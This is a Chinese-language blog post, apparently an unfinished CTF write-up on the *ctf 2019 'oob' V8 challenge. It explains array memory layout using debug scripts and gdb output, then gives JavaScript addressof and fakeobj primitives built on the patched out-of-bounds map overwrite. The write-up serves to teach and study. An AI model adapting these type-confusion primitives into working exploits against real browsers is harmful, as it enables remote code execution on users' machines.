@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.2">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.2">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.2">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.2" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.2">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.4.2',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;踩坑警告。。本文主要对之前的CTF赛题中分析的V8引擎及Chakra引擎的漏洞利用技术进行分析，因为时间紧张，还没有完全完成，只写了第一个最简单的漏洞分析，此处只是做备份记录，后续若有空会继续整理补充(很大可能会没空。。)。  V8 分析 &amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;V8引擎提供了大量的调试接口，比较常用的有%DebugPrin">
+<meta name="keywords" content="Chrome D8,Edge Chakra,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019-07-03-Chrome V8+Edge Chakra引擎漏洞利用技术分析（未完成）">
+<meta property="og:url" content="https:&#x2F;&#x2F;huhu0706.github.io&#x2F;2019&#x2F;07&#x2F;03&#x2F;2019-07-03-Chrome-V8-Edge-Chakra%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90&#x2F;index.html">
+<meta property="og:site_name" content="huhu&#39;s blog">
+<meta property="og:description" content="&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;踩坑警告。。本文主要对之前的CTF赛题中分析的V8引擎及Chakra引擎的漏洞利用技术进行分析，因为时间紧张，还没有完全完成，只写了第一个最简单的漏洞分析，此处只是做备份记录，后续若有空会继续整理补充(很大可能会没空。。)。  V8 分析 &amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;V8引擎提供了大量的调试接口，比较常用的有%DebugPrin">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;huhu0706.github.io&#x2F;2019&#x2F;07&#x2F;03&#x2F;2019-07-03-Chrome-V8-Edge-Chakra%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90&#x2F;1-diff%E6%96%87%E4%BB%B6%E4%B8%AD%E6%B7%BB%E5%8A%A0oob%E6%96%B9%E6%B3%95.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;huhu0706.github.io&#x2F;2019&#x2F;07&#x2F;03&#x2F;2019-07-03-Chrome-V8-Edge-Chakra%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90&#x2F;2-diff%E6%96%87%E4%BB%B6%E4%B8%ADoob%E5%87%BD%E6%95%B0%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%86%99.png">
+<meta property="og:updated_time" content="2020-06-25T03:12:54.066Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;huhu0706.github.io&#x2F;2019&#x2F;07&#x2F;03&#x2F;2019-07-03-Chrome-V8-Edge-Chakra%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90&#x2F;1-diff%E6%96%87%E4%BB%B6%E4%B8%AD%E6%B7%BB%E5%8A%A0oob%E6%96%B9%E6%B3%95.png">
+
+<link rel="canonical" href="https://huhu0706.github.io/2019/07/03/2019-07-03-Chrome-V8-Edge-Chakra%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>2019-07-03-Chrome V8+Edge Chakra引擎漏洞利用技术分析（未完成） | huhu's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">huhu's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/huhu0706" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://huhu0706.github.io/2019/07/03/2019-07-03-Chrome-V8-Edge-Chakra%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/main.gif">
+      <meta itemprop="name" content="huhu">
+      <meta itemprop="description" content="悟已往之不谏、知来者之可追">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="huhu's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2019-07-03-Chrome V8+Edge Chakra引擎漏洞利用技术分析（未完成）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-07-03 20:31:55" itemprop="dateCreated datePublished" datetime="2019-07-03T20:31:55+08:00">2019-07-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-06-25 11:12:54" itemprop="dateModified" datetime="2020-06-25T11:12:54+08:00">2020-06-25</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞利用</span>
+                  </a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>&ensp;&ensp;&ensp;&ensp;踩坑警告。。本文主要对之前的CTF赛题中分析的V8引擎及Chakra引擎的漏洞利用技术进行分析，因为时间紧张，还没有完全完成，只写了第一个最简单的漏洞分析，此处只是做备份记录，后续若有空会继续整理补充(很大可能会没空。。)。</p>
+</blockquote>
+<h2 id="V8-分析"><a href="#V8-分析" class="headerlink" title="V8 分析"></a>V8 分析</h2><blockquote>
+<p>&ensp;&ensp;&ensp;&ensp;V8引擎提供了大量的调试接口，比较常用的有%DebugPrint、%SystemBreak等，用户在调试过程中设置断点及查看对象信息等。在gdb的init脚本中添加辅助调试d8的gdbinit脚本之后也可以使用Job命令解析对象结构成员属性。在下文中会进行讲解。</p>
+</blockquote>
+<a id="more"></a>
+<h3 id="oob（-ctf-2019）"><a href="#oob（-ctf-2019）" class="headerlink" title="oob（*ctf 2019）"></a>oob（*ctf 2019）</h3><hr>
+<p>&ensp;&ensp;&ensp;&ensp;这道题目算是V8引擎的入门题目，比较适合用来入门练手，首先题目给了一份魔改的Chrome源码并给出了对应的diff文件，来看diff文件内容：<br><img src="1-diff%E6%96%87%E4%BB%B6%E4%B8%AD%E6%B7%BB%E5%8A%A0oob%E6%96%B9%E6%B3%95.png" alt=""></p>
+<p>&ensp;&ensp;&ensp;&ensp;在patch中定义了一个array类型的oob方法，该方法的实现为：
+
+<p><img src="2-diff%E6%96%87%E4%BB%B6%E4%B8%ADoob%E5%87%BD%E6%95%B0%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%86%99.png" alt=""></p>
+<p>&ensp;&ensp;&ensp;&ensp;我们常见的array类型一般以0索引为第一个元素，直接以Length访问array类型即会产生OffByOne漏洞，那么在array数组越界读取1字节的内容是什么呢？下面我们来看一下不同类型的数组在内存中的分配都有什么特点：
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">class Memory&#123;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        this.buf = new ArrayBuffer(8);</span><br><span class="line">        this.f64 = new Float64Array(this.buf);</span><br><span class="line">        this.u32 = new Uint32Array(this.buf);</span><br><span class="line">        this.bytes = new Uint8Array(this.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    //封装的类型转换函数，完成浮点数与整形的转换</span><br><span class="line">    d2u(val)&#123;</span><br><span class="line">        this.f64[0] = val;</span><br><span class="line">        let tmp = Array.from(this.u32);</span><br><span class="line">        return tmp[1] * 0x100000000 + tmp[0];</span><br><span class="line">    &#125;</span><br><span class="line">    u2d(val)&#123;</span><br><span class="line">        let tmp = [];</span><br><span class="line">        tmp[0] = parseInt(val % 0x100000000);</span><br><span class="line">        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);</span><br><span class="line">        this.u32.set(tmp);</span><br><span class="line">        return this.f64[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function gc()&#123;</span><br><span class="line">    for(let i = 0 ; i &lt; 0x10; i++)&#123;</span><br><span class="line">        new ArrayBuffer(0x1000000);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var mem = new Memory();</span><br><span class="line">// gc();</span><br><span class="line">var test = mem.u2d(0x234567);</span><br><span class="line">test_array=[</span><br><span class="line">    test,</span><br><span class="line">    mem.u2d(0),</span><br><span class="line">    mem.u2d(0x1234567887654321),</span><br><span class="line">    mem.u2d(0x100000000)</span><br><span class="line">];</span><br><span class="line">test_array0=[</span><br><span class="line">    mem.u2d(0x234567),</span><br><span class="line">    mem.u2d(0),</span><br><span class="line">    mem.u2d(0x1234567887654321),</span><br><span class="line">    mem.u2d(0x100000000)</span><br><span class="line">];</span><br><span class="line">test_array1=[</span><br><span class="line">    1.1,</span><br><span class="line">    mem.u2d(0),</span><br><span class="line">    mem.u2d(0x1234567887654321),</span><br><span class="line">    mem.u2d(0x100000000)</span><br><span class="line">];</span><br><span class="line">test_array2=[ 1.1,2.2,3.3];</span><br><span class="line">test_array3=[ 1,2,3];</span><br><span class="line"></span><br><span class="line">%DebugPrint(test_array);</span><br><span class="line">%DebugPrint(test_array0);</span><br><span class="line">%DebugPrint(test_array1);</span><br><span class="line">%DebugPrint(test_array2);</span><br><span class="line">%DebugPrint(test_array3);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
+<p>&ensp;&ensp;&ensp;&ensp;代码中用到的%DebugPrint、%SystemBreak即为V8提供的调试接口，正常运行时V8引擎是不支持该语句的，需要加上--allow-natives-syntax参数，在gdb中运行到SystemBreak中断时，可以使用job命令查看DebugPrint打印出的对象成员信息：
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">//打印的结果</span><br><span class="line">0x20263b38f2e9 &lt;JSArray[4]&gt;   //test_array</span><br><span class="line">0x20263b38f7b1 &lt;JSArray[4]&gt;  //test_array0</span><br><span class="line">0x20263b38fca1 &lt;JSArray[4]&gt;  //test_array1</span><br><span class="line">0x20263b390041 &lt;JSArray[3]&gt; //test_array2</span><br><span class="line">0x20263b390061 &lt;JSArray[3]&gt; //test_array3</span><br><span class="line">gdb-peda$ job 0x20263b38f2e9</span><br><span class="line">0x20263b38f2e9: [JSArray]</span><br><span class="line"> - map: 0x0658823c2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x02ad6c251111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x20263b38f309 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x30ecd99c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x256279e801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x20263b38f309 &lt;FixedDoubleArray[4]&gt; &#123;</span><br><span class="line">           0: 1.14205e-317</span><br><span class="line">           1: 0</span><br><span class="line">           2: 5.62635e-221</span><br><span class="line">           3: 2.122e-314</span><br><span class="line"> &#125;</span><br><span class="line"> //查看Array Object的结构：</span><br><span class="line"> gdb-peda$ telescope 0x20263b38f2e8</span><br><span class="line">0000| 0x20263b38f2e8 --&gt; 0x658823c2ed9 --&gt; 0x4000030ecd99c01  //map</span><br><span class="line">0008| 0x20263b38f2f0 --&gt; 0x30ecd99c0c71 --&gt; 0x30ecd99c08        //property</span><br><span class="line">0016| 0x20263b38f2f8 --&gt; 0x20263b38f309 --&gt; 0x30ecd99c14       //elements</span><br><span class="line">0024| 0x20263b38f300 --&gt; 0x400000000                                   //length</span><br><span class="line">0032| 0x20263b38f308 --&gt; 0x30ecd99c14f9 --&gt; 0x30ecd99c01 </span><br><span class="line">0040| 0x20263b38f310 --&gt; 0x400000000 </span><br><span class="line">0048| 0x20263b38f318 --&gt; 0x234567 (&apos;gE#&apos;)</span><br><span class="line">0056| 0x20263b38f320 --&gt; 0x0 </span><br><span class="line"></span><br><span class="line">gdb-peda$ job 0x20263b38f7b1</span><br><span class="line">0x20263b38f7b1: [JSArray]</span><br><span class="line"> - map: 0x0658823c2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x02ad6c251111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x20263b38f8e9 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x30ecd99c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x256279e801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x20263b38f8e9 &lt;FixedDoubleArray[4]&gt; &#123;</span><br><span class="line">           0: 1.14205e-317</span><br><span class="line">           1: 0</span><br><span class="line">           2: 5.62635e-221</span><br><span class="line">           3: 2.122e-314</span><br><span class="line"> &#125;</span><br><span class="line">gdb-peda$ job 0x20263b38fca1</span><br><span class="line">0x20263b38fca1: [JSArray]</span><br><span class="line"> - map: 0x0658823c2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x02ad6c251111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x20263b38fc71 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x30ecd99c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x256279e801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x20263b38fc71 &lt;FixedDoubleArray[4]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 0</span><br><span class="line">           2: 5.62635e-221</span><br><span class="line">           3: 2.122e-314</span><br><span class="line"> &#125;</span><br><span class="line">gdb-peda$ job 0x20263b390041</span><br><span class="line">0x20263b390041: [JSArray]</span><br><span class="line"> - map: 0x0658823c2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x02ad6c251111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x20263b390019 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x30ecd99c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x256279e801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x20263b390019 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.2</span><br><span class="line">           2: 3.3</span><br><span class="line"> &#125;</span><br><span class="line">gdb-peda$ job 0x20263b390061</span><br><span class="line">0x20263b390061: [JSArray]</span><br><span class="line"> - map: 0x0658823c2d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x02ad6c251111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x20263b38e901 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x30ecd99c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x256279e801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x20263b38e901 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>&ensp;&ensp;&ensp;&ensp;注意在上述代码中查看Array的机构时使用的job 0x20263b38f2e9，telescope 0x20263b38f2e8，根据V8的数据表示类型，Object类型的最低位为1，整形数值最低位为0，所以对象的值需要减一才能在内存中正确查看。
+<p>&ensp;&ensp;&ensp;&ensp;仔细查看上面的代码我们能够注意到只有test_array对象的elements指针是紧挨着对象所在位置之后的，test_array0及test_array3数组中elements指针指向的地址与对象本身差距较大，而test_array1、test_array2对象的elements指针为对象位置之前，回到上述oob函数的越界读取漏洞，只有test_array1、test_array2对象能够越界读取或写入对象本身的数据，越界访问到的内容为对象的map值，对象的map值标识着对象元素中数据的类型，这里可以很容易的想到读写map值完成类型混淆。
+<p>&ensp;&ensp;&ensp;&ensp;为了完成V8的漏洞利用中一般需要使用漏洞完成addressof及fakeobj原语，分别为泄露对象地址及伪造对象（用于完成后面任意地址读写操作），根据漏洞类型也可以不用实现fakeobj功能，直接实现任意地址读写read及write。下面来看如何这道题目如何利用oob实现addrof及fakeobj函数：
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">var obj=&#123;&#125;;</span><br><span class="line">var obj_array=[obj];</span><br><span class="line">var double_array=[1.1,2.2];</span><br><span class="line">%DebugPrint(obj_array);</span><br><span class="line">%DebugPrint(double_array);</span><br><span class="line">var obj_array_map = obj_array.oob();</span><br><span class="line">var double_array_map = double_array.oob();</span><br><span class="line">console.log(&quot;[-] obj_array_map: 0x&quot;+mem.d2u(obj_array_map).toString(16));</span><br><span class="line">console.log(&quot;[-] double_array_map: 0x&quot;+mem.d2u(double_array_map).toString(16));</span><br><span class="line">function addressof(obj_to_leak)&#123;</span><br><span class="line">    obj_array[0] = obj_to_leak;</span><br><span class="line">    obj_array.oob(double_array_map);</span><br><span class="line">    obj_addr = mem.d2u(obj_array[0])-1;</span><br><span class="line">    obj_array.oob(obj_array_map);</span><br><span class="line">    return obj_addr;</span><br><span class="line">&#125;</span><br><span class="line">function fakeobj(fake_addr)&#123;</span><br><span class="line">    double_array[0] = mem.u2d(fake_addr+0x1);</span><br><span class="line">    double_array.oob(obj_array_map);</span><br><span class="line">    fake_obj = double_array[0];</span><br><span class="line">    double_array.oob(double_array_map);</span><br><span class="line">    return fake_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
